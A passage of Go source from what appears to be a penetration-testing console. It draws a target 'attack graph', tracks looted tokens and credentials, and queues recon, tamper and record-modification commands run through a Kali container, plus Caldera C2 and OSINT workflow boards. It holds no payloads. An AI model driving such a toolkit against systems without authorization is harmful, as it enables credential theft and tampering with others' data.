		return strings.TrimRight(kaliTargetURL(state), "/")
	}
	if kaliBase == "" {
		return trimmed
	}
	if !strings.HasPrefix(strings.ToLower(trimmed), "http://") && !strings.HasPrefix(strings.ToLower(trimmed), "https://") {
		return normalizeLootEndpoint(kaliBase, trimmed)
	}
	parsedEndpoint, endpointErr := url.Parse(trimmed)
	parsedLocal, localErr := url.Parse(strings.TrimSpace(localTargetURL(state)))
	parsedKali, kaliErr := url.Parse(kaliBase)
	if endpointErr != nil || localErr != nil || kaliErr != nil {
		return trimmed
	}
	localHost := strings.ToLower(strings.TrimSpace(parsedLocal.Host))
	endpointHost := strings.ToLower(strings.TrimSpace(parsedEndpoint.Host))
	if localHost == "" || endpointHost == "" || endpointHost != localHost {
		return trimmed
	}
	parsedEndpoint.Scheme = parsedKali.Scheme
	parsedEndpoint.Host = parsedKali.Host
	return parsedEndpoint.String()
}

func buildExploitAttackGraph(state stateFile, commands []commandEntry, findings []findingEntry, loot []lootEntry) []attackGraphNode {
	s := deriveChainSnapshot(commands, findings, loot)
	target := valueOr(targetHostFromURL(state.TargetURL), "target")
	collections := extractCollectionRecords(loot, state.TargetURL)
	authPwned := s.Breach || s.Access || hasLootMatch(loot, "token") || hasLootMatch(loot, "credential") || hasLootMatch(loot, "jwt")
	apiPwned := hasFindingMatch(findings, "api") || hasLootMatch(loot, "/api/") || hasLootMatch(loot, "endpoint")
	dbPwned := hasLootMatch(loot, "database") || hasLootMatch(loot, "mysql") || hasLootMatch(loot, "postgres") || hasLootMatch(loot, ".db")
	filesPwned := hasLootMatch(loot, "backup") || hasLootMatch(loot, "artifact") || hasLootMatch(loot, "binary") || hasLootMatch(loot, "document") || hasLootMatch(loot, "path")
	impactPwned := s.Tamper || s.Exfil || len(collections) > 0 || hasLootMatch(loot, "flag")
	objectivePwned := hasLootMatch(loot, "flag") || impactPwned
	nodes := []attackGraphNode{
		{ID: "target", Parent: "", Kind: "cluster", Label: "TARGET " + target, Depth: 0, Pwned: s.Recon || authPwned || apiPwned, Opsec: 20, Detail: "Entry node for current engagement scope."},
		{ID: "surface", Parent: "target", Kind: "cluster", Label: "SURFACE MAP", Depth: 1, Pwned: s.Recon, Opsec: 35, Detail: "Endpoints, services, headers, exposed routes."},
		{ID: "auth", Parent: "target", Kind: "cluster", Label: "AUTH LANE", Depth: 1, Pwned: authPwned, Opsec: 55, Detail: "Session/JWT/credential abuse and auth-boundary pivots."},
		{ID: "api", Parent: "auth", Kind: "cluster", Label: "API LANE", Depth: 2, Pwned: apiPwned, Opsec: 60, Detail: "Authenticated API reads/writes and privilege abuse paths."},
	}
	apiEndpoints := exploitAPIDiscovery(findings, loot, state.TargetURL)
	endpointNodeByRef := map[string]string{}
	for idx, endpoint := range apiEndpoints {
		nodeID := fmt.Sprintf("api-endpoint-%d", idx+1)
		nodes = append(nodes, attackGraphNode{
			ID: nodeID, Parent: "api", Kind: "endpoint", Ref: endpoint, Label: truncate(endpoint, 58), Depth: 3,
			Pwned: hasLootMatch(loot, endpoint) || hasFindingMatch(findings, endpoint), Opsec: 62,
			Detail: "Discovered API/backend endpoint; selectable for direct exploration.",
		})
		endpointNodeByRef[strings.ToLower(strings.TrimSpace(endpoint))] = nodeID
	}
	if len(collections) > 0 {
		endpoints := make([]string, 0, len(collections))
		for endpoint := range collections {
			endpoints = append(endpoints, endpoint)
		}
		sort.Strings(endpoints)
		collectionIndex := 0
		for _, endpoint := range endpoints {
			collectionIndex++
			records := collections[endpoint]
			if len(records) == 0 {
				continue
			}
			collectionID := fmt.Sprintf("collection-%d-%s", collectionIndex, sanitizeToken(endpoint))
			if strings.TrimSpace(collectionID) == "" {
				collectionID = fmt.Sprintf("collection-%d", collectionIndex)
			}
			parent := "api"
			if nodeID, ok := endpointNodeByRef[strings.ToLower(strings.TrimSpace(endpoint))]; ok && strings.TrimSpace(nodeID) != "" {
				parent = nodeID
			}
			labelRef := endpoint
			if parsed, err := url.Parse(endpoint); err == nil {
				if strings.TrimSpace(parsed.Path) != "" {
					labelRef = parsed.Path
				}
			}
			nodes = append(nodes, attackGraphNode{
				ID: collectionID, Parent: parent, Kind: "collection", Ref: endpoint, Label: "COLLECTION " + truncate(labelRef, 42), Depth: 4,
				Pwned: true, Opsec: 60, Detail: "Structured records discovered from telemetry output.",
			})
			for idx, record := range records {
				if idx >= 32 {
					break
				}
				recordNodeID := fmt.Sprintf("%s-record-%s", collectionID, sanitizeToken(record.ID))
				if strings.TrimSpace(recordNodeID) == "" {
					recordNodeID = fmt.Sprintf("%s-record-%d", collectionID, idx+1)
				}
				recordRef := strings.TrimRight(endpoint, "/") + "/" + url.PathEscape(record.ID)
				nodes = append(nodes, attackGraphNode{
					ID: recordNodeID, Parent: collectionID, Kind: "record", Ref: recordRef,
					Label: fmt.Sprintf("record[%s] %s", truncate(record.ID, 18), truncate(record.Label, 30)),
					Depth: 5, Pwned: true, Opsec: 58,
					Detail: "Individual record discovered from live collection output.",
				})
			}
		}
	}
	nodes = append(nodes,
		attackGraphNode{ID: "db", Parent: "auth", Kind: "cluster", Label: "DB LANE", Depth: 2, Pwned: dbPwned, Opsec: 80, Detail: "Database-level pivot from extracted creds or artifact hints."},
		attackGraphNode{ID: "files", Parent: "surface", Kind: "cluster", Label: "FILE LANE", Depth: 2, Pwned: filesPwned, Opsec: 45, Detail: "Artifact/backup/file extraction and evidence mining."},
		attackGraphNode{ID: "impact", Parent: "target", Kind: "cluster", Label: "IMPACT LANE", Depth: 1, Pwned: impactPwned, Opsec: 85, Detail: "Integrity/exfil impact demonstrations and visible tamper."},
		attackGraphNode{ID: "objective", Parent: "impact", Kind: "cluster", Label: "OBJECTIVE", Depth: 2, Pwned: objectivePwned, Opsec: 90, Detail: "Goal completion (flags/business impact/evidence lock-in)."},
	)
	return nodes
}

func buildExploitAttackEdges(_ stateFile, _ []commandEntry, _ []findingEntry, nodes []attackGraphNode) []attackGraphEdge {
	edges := make([]attackGraphEdge, 0, len(nodes))
	for _, node := range nodes {
		if strings.TrimSpace(node.Parent) == "" {
			continue
		}
		edges = append(edges, attackGraphEdge{
			From:   node.Parent,
			To:     node.ID,
			Label:  node.Kind,
			Pwned:  node.Pwned,
			Opsec:  node.Opsec,
			Detail: node.Detail,
		})
	}
	return edges
}

func exploitGraphNodeAction(node attackGraphNode, state stateFile, _ string) controlAction {
	localTarget := strings.TrimSpace(localTargetURL(state))
	switch node.ID {
	case "surface":
		return controlAction{
			Label:       "Surface Map Pipeline",
			Description: "Map reachable services/routes and surface candidates.",
			Mode:        "local",
			Command:     "python3 ./scripts/security_pipeline.py --target " + localTarget + " --pipeline surface-map",
		}
	case "auth":
		return controlAction{
			Label:       "Auth Boundary Probe",
			Description: "Probe auth/API boundary and method behavior.",
			Mode:        "local",
			Command:     "python3 ./scripts/security_pipeline.py --target " + localTarget + " --pipeline api-probe",
		}
	case "api":
		return controlAction{
			Label:       "API Probe Pipeline",
			Description: "Probe and map API surface from current target telemetry.",
			Mode:        "local",
			Command:     "python3 ./scripts/security_pipeline.py --target " + localTarget + " --pipeline api-probe",
		}
	case "db":
		return controlAction{
			Label:       "DB Pivot Check",
			Description: "Requires parseable DB credentials in loot before pivot.",
			Mode:        "kali",
			KaliShell:   "echo 'DB pivot requires parseable DB creds in loot first'",
		}
	case "files":
		return controlAction{
			Label:       "Web/File Enumeration",
			Description: "Enumerate file and web artifact surface from target.",
			Mode:        "local",
			Command:     "python3 ./scripts/security_pipeline.py --target " + localTarget + " --pipeline web-enum",
		}
	case "impact":
		return controlAction{
			Label:       "Full Chain Pipeline",
			Description: "Run complete chain from recon to objective signals.",
			Mode:        "local",
			Command:     "python3 ./scripts/security_pipeline.py --target " + localTarget + " --pipeline full-chain",
		}
	case "objective":
		return controlAction{
			Label:       "Objective Snapshot",
			Description: "Snapshot telemetry for objective handoff.",
			Mode:        "local",
			Command:     "python3 ./scripts/telemetryctl.py snapshot --name mission-objective",
		}
	default:
		if node.Kind == "endpoint" || node.Kind == "collection" || node.Kind == "record" {
			endpoint := rebaseEndpointForKali(node.Ref, state)
			label := "Inspect Endpoint HTTP"
			description := "Read headers/body from selected endpoint."
			if node.Kind == "collection" {
				label = "List Collection Records (HTTP)"
				description = "Fetch full HTTP response from selected collection endpoint."
			}
			if node.Kind == "record" {
				label = "Inspect Record HTTP"
				description = "Read full HTTP response from selected record endpoint."
			}
			return controlAction{
				Label:       label,
				Description: description,
				Mode:        "kali",
				KaliShell:   "curl -sS -i " + shellQuote(endpoint),
				Command:     "docker exec h3retik-kali bash -lc \"curl -sS -i " + shellQuote(endpoint) + "\"",
			}
		}
		return controlAction{
			Label:       "Quick Recon Profile",
			Description: "Fallback quick profile pipeline for selected map node.",
			Mode:        "local",
			Command:     "python3 ./scripts/security_pipeline.py --target " + localTarget + " --profile quick",
		}
	}
}

func synthLootForGraphNode(node attackGraphNode, _ stateFile) lootEntry {
	switch node.Kind {
	case "endpoint":
		return lootEntry{Kind: "path", Name: node.Label, Source: node.Ref, Preview: node.Detail}
	case "collection", "record":
		return lootEntry{Kind: "collection", Name: node.Label, Source: node.Ref, Preview: node.Detail}
	case "db":
		return lootEntry{Kind: "credential", Name: "db-lane", Source: node.Ref, Preview: node.Detail}
	case "files":
		return lootEntry{Kind: "artifact", Name: "file-lane", Source: node.Ref, Preview: node.Detail}
	case "auth":
		return lootEntry{Kind: "token", Name: "auth-lane", Source: node.Ref, Preview: node.Detail}
	default:
		return lootEntry{Kind: "path", Name: node.Label, Source: node.Ref, Preview: node.Detail}
	}
}

func filterGraphActions(node attackGraphNode, actions []controlAction) []controlAction {
	if len(actions) == 0 {
		return actions
	}
	allow := func(action controlAction) bool {
		meta := strings.ToLower(action.Label + " " + action.Description + " " + action.Command + " " + action.KaliShell)
		switch node.Kind {
		case "db":
			return strings.Contains(meta, "mysql") || strings.Contains(meta, "postgres") || strings.Contains(meta, "sqlite") || strings.Contains(meta, "database")
		case "files":
			return strings.Contains(meta, "artifact") || strings.Contains(meta, "sqlite") || strings.Contains(meta, "inspect")
		case "auth":
			return strings.Contains(meta, "auth") || strings.Contains(meta, "token") || strings.Contains(meta, "credential")
		case "endpoint":
			return strings.Contains(meta, "endpoint") || strings.Contains(meta, "probe") || strings.Contains(meta, "curl") || strings.Contains(meta, "credential fit")
		case "collection", "record":
			return strings.Contains(meta, "collection") || strings.Contains(meta, "record") || strings.Contains(meta, "write") || strings.Contains(meta, "update") || strings.Contains(meta, "credential fit")
		default:
			return true
		}
	}
	filtered := make([]controlAction, 0, len(actions))
	for _, action := range actions {
		if allow(action) {
			filtered = append(filtered, action)
		}
	}
	if len(filtered) == 0 {
		return actions
	}
	return filtered
}

func exploitGraphNodeActions(node attackGraphNode, state stateFile, loot []lootEntry, root string) []controlAction {
	actions := []controlAction{exploitGraphNodeAction(node, state, root)}
	synth := synthLootForGraphNode(node, state)
	kaliTarget := kaliTargetURL(state)
	followups := lootFollowupActions(synth, kaliTarget, root)
	if len(followups) > 0 {
		actions = append(actions, followups...)
	}
	for _, item := range loot {
		meta := strings.ToLower(item.Kind + " " + item.Name + " " + item.Source + " " + item.Preview)
		attach := false
		switch node.Kind {
		case "db":
			attach = strings.Contains(meta, "db") || strings.Contains(meta, "mysql") || strings.Contains(meta, "postgres") || strings.Contains(meta, "sqlite")
		case "files":
			attach = strings.Contains(meta, "artifact") || strings.Contains(meta, "file") || strings.Contains(meta, ".txt") || strings.Contains(meta, ".json")
		case "auth":
			attach = strings.Contains(meta, "token") || strings.Contains(meta, "jwt") || strings.Contains(meta, "credential") || strings.Contains(meta, "password")
		case "endpoint":
			attach = strings.Contains(meta, strings.ToLower(strings.TrimSpace(node.Ref)))
		case "collection", "record":
			refToken := strings.ToLower(strings.TrimSpace(node.Ref))
			labelToken := strings.ToLower(strings.TrimSpace(node.Label))
			attach = (refToken != "" && strings.Contains(meta, refToken)) || (labelToken != "" && strings.Contains(meta, labelToken))
		}
		if !attach {
			continue
		}
		actions = append(actions, lootFollowupActions(item, kaliTarget, root)...)
		if len(actions) > 16 {
			break
		}
	}
	actions = filterGraphActions(node, actions)
	unique := make([]controlAction, 0, len(actions))
	seen := map[string]bool{}
	for _, action := range actions {
		key := strings.ToLower(strings.TrimSpace(valueOr(action.KaliShell, action.Command)))
		if key == "" || seen[key] {
			continue
		}
		seen[key] = true
		unique = append(unique, action)
		if len(unique) >= 16 {
			break
		}
	}
	if len(unique) <= 1 {
		return unique
	}
	result := []controlAction{unique[0]}
	roleCap := map[string]int{"EXPLORE": 2, "TAMPER": 2, "MODIFY": 2}
	roleCount := map[string]int{graphActionRole(unique[0]): 1}
	for _, action := range unique[1:] {
		role := graphActionRole(action)
		cap := roleCap[role]
		if cap == 0 {
			cap = 2
		}
		if roleCount[role] >= cap {
			continue
		}
		roleCount[role]++
		result = append(result, action)
		if len(result) >= 6 {
			break
		}
	}
	return result
}

func graphActionRole(action controlAction) string {
	meta := strings.ToLower(action.Label + " " + action.Command + " " + action.KaliShell)
	switch {
	case strings.Contains(meta, "write"), strings.Contains(meta, "modify"), strings.Contains(meta, "update"), strings.Contains(meta, " -x put "), strings.Contains(meta, " -x patch "), strings.Contains(meta, " -x delete "), strings.Contains(meta, "create temporary"), strings.Contains(meta, "drop table"):
		return "MODIFY"
	case strings.Contains(meta, "probe"), strings.Contains(meta, "tamper"), strings.Contains(meta, "exploit"), strings.Contains(meta, "auth pivot"):
		return "TAMPER"
	default:
		return "EXPLORE"
	}
}

func graphNodeStatusBadge(pwned bool) string {
	if pwned {
		return lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("160")).Bold(true).Padding(0, 1).Render("PWN")
	}
	return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("151")).Bold(true).Padding(0, 1).Render("OPEN")
}

func graphRoleBadge(role string) string {
	switch strings.ToUpper(strings.TrimSpace(role)) {
	case "MODIFY":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("160")).Bold(true).Padding(0, 1).Render("MOD")
	case "TAMPER":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("214")).Bold(true).Padding(0, 1).Render("TMP")
	default:
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("117")).Bold(true).Padding(0, 1).Render("EXP")
	}
}

func graphRuntimeBadge(mode string) string {
	switch strings.ToLower(strings.TrimSpace(mode)) {
	case "kali":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("62")).Bold(true).Padding(0, 1).Render("KALI")
	case "local":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("245")).Bold(true).Padding(0, 1).Render("LOCAL")
	default:
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("153")).Bold(true).Padding(0, 1).Render(strings.ToUpper(valueOr(mode, "RUN")))
	}
}

func graphReadinessBadge(ready bool) string {
	if ready {
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("84")).Bold(true).Padding(0, 1).Render("READY")
	}
	return lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("160")).Bold(true).Padding(0, 1).Render("BLOCK")
}

func graphRoleDescription(role string) string {
	switch strings.ToUpper(strings.TrimSpace(role)) {
	case "MODIFY":
		return "writes or updates target data (state-changing action)"
	case "TAMPER":
		return "integrity probe to test mutation boundary or abuse path"
	default:
		return "safe read/inspect operation for discovery and validation"
	}
}

func graphNodeOperatorGuide(node attackGraphNode) string {
	switch {
	case strings.EqualFold(node.Kind, "collection"):
		return "Collection workflow: run list action once, then load editor from a record (auto-selects when available)."
	case strings.EqualFold(node.Kind, "record"):
		return "Record workflow: inspect endpoint, then use e/p/y/t and i (field edit) before f to apply mutation."
	case strings.EqualFold(node.Kind, "endpoint"):
		return "Endpoint workflow: inspect HTTP first, then choose tamper/modify only if preflight shows READY."
	case strings.EqualFold(node.Kind, "db"):
		return "DB workflow: collect credentials in LOOT first, then run DB pivot actions from map/loot follow-ups."
	default:
		return "Standard flow: navigate node → select action (1..9 or ,/.) → Enter preview/check → f execute."
	}
}

func buildGraphChildrenIndex(nodes []attackGraphNode) map[string][]int {
	children := map[string][]int{}
	for idx, node := range nodes {
		parent := strings.TrimSpace(node.Parent)
		if parent == "" {
			continue
		}
		children[parent] = append(children[parent], idx)
	}
	return children
}

func buildAttackTreeRows(nodes []attackGraphNode, collapsed map[string]bool) []attackGraphNavPos {
	rows := make([]attackGraphNavPos, 0, len(nodes))
	if len(nodes) == 0 {
		return rows
	}
	children := buildGraphChildrenIndex(nodes)
	roots := make([]int, 0, 1)
	for idx, node := range nodes {
		if strings.TrimSpace(node.Parent) == "" {
			roots = append(roots, idx)
		}
	}
	visited := map[int]bool{}
	var walk func(idx int)
	walk = func(idx int) {
		if visited[idx] {
			return
		}
		visited[idx] = true
		rows = append(rows, attackGraphNavPos{Depth: nodes[idx].Depth, Row: idx})
		if collapsed != nil && collapsed[nodes[idx].ID] {
			return
		}
		for _, kidIdx := range children[nodes[idx].ID] {
			walk(kidIdx)
		}
	}
	for _, root := range roots {
		walk(root)
	}
	for idx := range nodes {
		if !visited[idx] {
			rows = append(rows, attackGraphNavPos{Depth: nodes[idx].Depth, Row: idx})
		}
	}
	return rows
}

func graphMoveIndex(nodes []attackGraphNode, collapsed map[string]bool, current int, direction string) int {
	if len(nodes) == 0 {
		return current
	}
	current = clampWrap(current, len(nodes))
	treeRows := buildAttackTreeRows(nodes, collapsed)
	order := make([]int, 0, len(treeRows))
	orderPos := map[int]int{}
	for pos, row := range treeRows {
		order = append(order, row.Row)
		orderPos[row.Row] = pos
	}
	children := buildGraphChildrenIndex(nodes)
	indexByID := map[string]int{}
	for idx, node := range nodes {
		indexByID[node.ID] = idx
	}
	switch strings.ToLower(strings.TrimSpace(direction)) {
	case "left":
		parent := strings.TrimSpace(nodes[current].Parent)
		if idx, ok := indexByID[parent]; ok {
			return idx
		}
	case "right":
		if kids := children[nodes[current].ID]; len(kids) > 0 {
			return kids[0]
		}
	case "up":
		pos := orderPos[current]
		if pos > 0 {
			return order[pos-1]
		}
	case "down":
		pos := orderPos[current]
		if pos+1 < len(order) {
			return order[pos+1]
		}
	}
	return current
}

func renderExploitAttackGraphASCII(nodes []attackGraphNode, edges []attackGraphEdge, selected int, width int, collapsed map[string]bool) string {
	if len(nodes) == 0 {
		return "no graph nodes"
	}
	_ = edges
	selected = clampWrap(selected, len(nodes))
	width = max(48, width)
	children := buildGraphChildrenIndex(nodes)
	if collapsed == nil {
		collapsed = map[string]bool{}
	}
	roots := []int{}
	for idx, node := range nodes {
		if strings.TrimSpace(node.Parent) == "" {
			roots = append(roots, idx)
		}
	}
	lines := make([]string, 0, len(nodes)+6)
	visited := map[int]bool{}
	var walk func(idx int, prefix string, isLast bool, isRoot bool)
	walk = func(idx int, prefix string, isLast bool, isRoot bool) {
		if visited[idx] {
			return
		}
		visited[idx] = true
		node := nodes[idx]
		connector := ""
		nextPrefix := prefix
		if !isRoot {
			if isLast {
				connector = "└─ "
				nextPrefix += "   "
			} else {
				connector = "├─ "
				nextPrefix += "│  "
			}
		}
		cursor := "  "
		if idx == selected {
			cursor = "▸ "
		}
		status := "OPEN"
		if node.Pwned {
			status = "PWN "
		}
		hasChildren := len(children[node.ID]) > 0
		folder := "[·]"
		if hasChildren {
			if collapsed[node.ID] {
				folder = "[+]"
			} else {
				folder = "[-]"
			}
		}
		kind := "ITEM"
		switch strings.ToLower(strings.TrimSpace(node.Kind)) {
		case "cluster":
			kind = "DIR"
		case "endpoint":
			kind = "ENDPOINT"
		case "collection":
			kind = "COLLECT"
		case "record":
			kind = "RECORD"
		}
		label := truncate(node.Label, max(10, width-42))
		line := fmt.Sprintf("%s%s%s%s [%s] [%s] %s", cursor, prefix, connector, folder, status, kind, label)
		lines = append(lines, truncate(line, max(20, width-2)))
		if collapsed[node.ID] {
			return
		}
		kids := children[node.ID]
		for kidPos, kidIdx := range kids {
			walk(kidIdx, nextPrefix, kidPos == len(kids)-1, false)
		}
	}
	for pos, root := range roots {
		walk(root, "", pos == len(roots)-1, true)
	}
	for idx := range nodes {
		if !visited[idx] {
			walk(idx, "", true, true)
		}
	}
	legendA := truncate("legend: [-] open folder  [+] collapsed folder  [·] leaf", max(20, width-2))
	legendB := truncate("legend: [OPEN]/[PWN] status  [DIR]/[ENDPOINT]/[COLLECT]/[RECORD] type", max(20, width-2))
	legendC := truncate("tree nav: ↑/↓ tree  ← parent/collapse  → expand/child  h/l collapse-expand  ,/. cycle action  Enter preview  f run", max(20, width-2))
	lines = append(lines,
		"",
		legendA,
		legendB,
		legendC,
	)
	return strings.Join(lines, "\n")
}

func (m model) renderExploitGraphNodeDetail(node attackGraphNode, edges []attackGraphEdge, selectedAction int, width int) string {
	exploitLoot := lootByMode(m.loot, "exploit")
	actions := exploitGraphNodeActions(node, m.state, exploitLoot, m.root)
	if len(actions) == 0 {
		fallback := exploitGraphNodeAction(node, m.state, m.root)
		if strings.TrimSpace(fallback.Command) != "" || strings.TrimSpace(fallback.KaliShell) != "" {
			actions = append(actions, fallback)
		}
	}
	action := controlAction{}
	if len(actions) > 0 {
		selectedAction = clampWrap(selectedAction, len(actions))
		action = actions[selectedAction]
	}
	access := "inspect"
	switch node.Kind {
	case "record":
		access = "record inspect / edit-ready"
	case "collection", "endpoint", "cluster":
		access = "read/explore"
	}
	edgeLines := []string{}
	for _, edge := range edges {
		if edge.From != node.ID && edge.To != node.ID {
			continue
		}
		edgeState := "open"
		if edge.Pwned {
			edgeState = "pwned"
		}
		edgeLines = append(edgeLines, fmt.Sprintf("%s -> %s [%s] opsec=%d", strings.ToUpper(edge.From), strings.ToUpper(edge.To), edgeState, edge.Opsec))
		if len(edgeLines) >= 4 {
			break
		}
	}
	if len(edgeLines) == 0 {
		edgeLines = append(edgeLines, "no linked transitions")
	}
	actionLines := []string{}
	for idx, candidate := range actions {
		role := graphActionRole(candidate)
		roleTag := graphRoleBadge(role)
		runTag := graphRuntimeBadge(candidate.Mode)
		ready, reason := m.preflightArchGraphAction(candidate)
		readyTag := graphReadinessBadge(ready)
		label := truncate(valueOr(strings.TrimSpace(candidate.Label), valueOr(candidate.Command, candidate.KaliShell)), max(24, width-24))
		line := fmt.Sprintf("  %s %s %s %d) %s", roleTag, runTag, readyTag, idx+1, label)
		desc := truncate(valueOr(strings.TrimSpace(candidate.Description), graphRoleDescription(role)), max(20, width-8))
		if !ready && strings.TrimSpace(reason) != "" {
			desc = truncate(desc+" | blocked: "+reason, max(20, width-8))
		}
		if idx == selectedAction {
			line = lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("57")).Bold(true).Render("▸ " + strings.TrimSpace(line))
			line += "\n" + lipgloss.NewStyle().Foreground(lipgloss.Color("249")).Render("    ↳ "+desc)
		} else {
			line += "\n" + lipgloss.NewStyle().Foreground(lipgloss.Color("244")).Render("    ↳ "+desc)
		}
		actionLines = append(actionLines, line)
		if idx >= 11 {
			break
		}
	}
	if len(actionLines) == 0 {
		actionLines = append(actionLines, "no dynamic actions available")
	}
	selectedCommand := valueOr(strings.TrimSpace(action.Command), action.KaliShell)
	if strings.TrimSpace(selectedCommand) == "" {
		selectedCommand = "no runnable command for selected node/action"
	}
	selectedReady, selectedReason := m.preflightArchGraphAction(action)
	preflightLine := "ready"
	if !selectedReady {
		preflightLine = "blocked"
		if strings.TrimSpace(selectedReason) != "" {
			preflightLine += " :: " + selectedReason
		}
	}
	statusLine := lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("status: ") + graphNodeStatusBadge(node.Pwned)
	return strings.Join([]string{
		metricLine("node", node.Label),
		metricLine("kind", valueOr(strings.TrimSpace(node.Kind), "node")),
		metricLine("ref", valueOr(strings.TrimSpace(node.Ref), "n/a")),
		statusLine,
		metricLine("access", access),
		metricLine("opsec meter", opsecMeter(node.Opsec)),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("node detail"),
		wrap(node.Detail, width),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("linked transitions"),
		wrap(strings.Join(edgeLines, " | "), width),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("action menu"),
		strings.Join(actionLines, "\n"),
		metricLine("preflight", preflightLine),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("selected command"),
		wrap(selectedCommand, width),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("operator flow"),
		wrap(graphNodeOperatorGuide(node), width),
	}, "\n")
}

func modeChainBoard(mode string, commands []commandEntry, findings []findingEntry, loot []lootEntry, width int) string {
	switch strings.ToLower(strings.TrimSpace(mode)) {
	case "osint":
		seed := hasCommandMatch(commands, "seed-harvest")
		deep := hasCommandMatch(commands, "bbot") || hasCommandMatch(commands, "spiderfoot")
		correlation := len(loot) > 0
		lines := []string{
			fmt.Sprintf("%s SEED", statusBadge(ternary(seed, "done", "idle"))),
			fmt.Sprintf("%s ENRICH", statusBadge(ternary(deep, "done", "idle"))),
			fmt.Sprintf("%s REPORT", statusBadge(ternary(correlation, "done", "idle"))),
		}
		return wrap(strings.Join(lines, " | "), width)
	case "onchain":
		rpc := hasCommandMatch(commands, "rpc-check")
		flow := hasCommandMatch(commands, "address-flow")
		audit := hasCommandMatch(commands, "slither") || hasCommandMatch(commands, "mythril")
		fuzz := hasCommandMatch(commands, "echidna") || hasCommandMatch(commands, "medusa") || hasCommandMatch(commands, "halmos")
		lines := []string{
			fmt.Sprintf("%s RPC", statusBadge(ternary(rpc, "done", "idle"))),
			fmt.Sprintf("%s FLOW", statusBadge(ternary(flow, "done", "idle"))),
			fmt.Sprintf("%s AUDIT", statusBadge(ternary(audit, "done", "idle"))),
			fmt.Sprintf("%s FUZZ", statusBadge(ternary(fuzz, "done", "idle"))),
		}
		return wrap(strings.Join(lines, " | "), width)
	case "coop":
		c2 := hasCommandMatch(commands, "coop-caldera-up") || hasCommandMatch(commands, "coop-caldera-status")
		agents := hasCommandMatch(commands, "/api/agents") || hasCommandMatch(commands, "op-report")
		ops := hasCommandMatch(commands, "/api/operations") || hasCommandMatch(commands, "op-report")
		lines := []string{
			fmt.Sprintf("%s C2", statusBadge(ternary(c2, "done", "idle"))),
			fmt.Sprintf("%s AGENTS", statusBadge(ternary(agents, "done", "idle"))),
			fmt.Sprintf("%s OPS", statusBadge(ternary(ops, "done", "idle"))),
		}
		return wrap(strings.Join(lines, " | "), width)
	default:
		return attackChainBoard(commands, findings, loot, width)
	}
}

func modeWorkflowBoard(mode string, commands []commandEntry, findings []findingEntry, loot []lootEntry, width int) string {
	switch strings.ToLower(strings.TrimSpace(mode)) {
	case "osint":
		seed := hasCommandMatch(commands, "osint-seed-harvest")
		discovery := hasCommandMatch(commands, "osint-deep-bbot") || hasCommandMatch(commands, "osint-deep-spiderfoot")
		collection := hasCommandMatch(commands, "osint-reconng") || hasCommandMatch(commands, "osint-rengine")
		analysis := len(findings)+len(loot) > 0
		reporting := hasCommandMatch(commands, "telemetryctl.py snapshot")
		lines := []string{
			fmt.Sprintf("%s INPUT", statusBadge(ternary(seed, "done", "idle"))),
			fmt.Sprintf("%s DISCOVERY", statusBadge(ternary(discovery, "done", "idle"))),
			fmt.Sprintf("%s COLLECTION", statusBadge(ternary(collection, "done", "idle"))),
			fmt.Sprintf("%s ANALYSIS", statusBadge(ternary(analysis, "done", "idle"))),
			fmt.Sprintf("%s REPORTING", statusBadge(ternary(reporting, "done", "idle"))),
		}
		return wrap(strings.Join(lines, " | "), width)
	case "onchain":
		scope := strings.TrimSpace(mode) != ""
		rpc := hasCommandMatch(commands, "onchain-rpc-check")
		flow := hasCommandMatch(commands, "onchain-address-flow")
		staticAudit := hasCommandMatch(commands, "onchain-slither") || hasCommandMatch(commands, "onchain-mythril")
		dynamicAudit := hasCommandMatch(commands, "onchain-echidna") || hasCommandMatch(commands, "onchain-medusa") || hasCommandMatch(commands, "onchain-halmos")
		reporting := hasCommandMatch(commands, "telemetryctl.py snapshot")
		lines := []string{
			fmt.Sprintf("%s SCOPE", statusBadge(ternary(scope, "done", "idle"))),
			fmt.Sprintf("%s RPC", statusBadge(ternary(rpc, "done", "idle"))),
			fmt.Sprintf("%s FLOW", statusBadge(ternary(flow, "done", "idle"))),
			fmt.Sprintf("%s STATIC", statusBadge(ternary(staticAudit, "done", "idle"))),
			fmt.Sprintf("%s DYNAMIC", statusBadge(ternary(dynamicAudit, "done", "idle"))),
			fmt.Sprintf("%s EXPORT", statusBadge(ternary(reporting, "done", "idle"))),
		}
		return wrap(strings.Join(lines, " | "), width)
	case "coop":
		launch := hasCommandMatch(commands, "coop-caldera-up")
		status := hasCommandMatch(commands, "coop-caldera-status")
		agents := hasCommandMatch(commands, "/api/agents") || hasCommandMatch(commands, "op-report")
		operations := hasCommandMatch(commands, "/api/operations") || hasCommandMatch(commands, "op-report")
		report := hasCommandMatch(commands, "coop-caldera-op-report")
		lines := []string{
			fmt.Sprintf("%s CALDERA", statusBadge(ternary(launch, "done", "idle"))),
			fmt.Sprintf("%s STATUS", statusBadge(ternary(status, "done", "idle"))),
			fmt.Sprintf("%s AGENTS", statusBadge(ternary(agents, "done", "idle"))),
			fmt.Sprintf("%s OPERATIONS", statusBadge(ternary(operations, "done", "idle"))),
			fmt.Sprintf("%s REPORT", statusBadge(ternary(report, "done", "idle"))),
		}
		return wrap(strings.Join(lines, " | "), width)
	default:
		recon := hasCommandMatch(commands, "recon") || hasCommandMatch(commands, "nmap")
